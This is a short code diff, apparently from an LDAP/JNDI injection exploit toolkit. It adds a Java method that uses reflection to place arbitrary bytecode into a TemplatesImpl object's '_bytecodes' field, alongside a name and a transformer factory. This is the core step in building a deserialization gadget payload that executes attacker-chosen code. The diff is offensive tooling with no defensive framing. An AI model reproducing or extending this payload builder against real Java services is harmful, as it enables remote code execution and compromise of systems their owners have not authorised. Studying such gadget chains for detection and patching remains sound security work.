@@ -1,5 +1,7 @@
 package com.idiot9.ldap.templates;
 
+import com.idiot9.ldap.gadgets.utils.ClassFiles;
+import com.idiot9.ldap.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
@@ -23,6 +25,13 @@ public interface TemplateFactory {
     final Class tplClass = TemplatesImpl.class;
     final Class abstTranslet = AbstractTranslet.class;
     final Class transFactory = TransformerFactoryImpl.class;
+
+    public static Templates loadBytes(byte[] bytes, Templates templates) throws Exception {
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {bytes});
+        Reflections.setFieldValue(templates, "_name", "1diot9");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
 
 
 
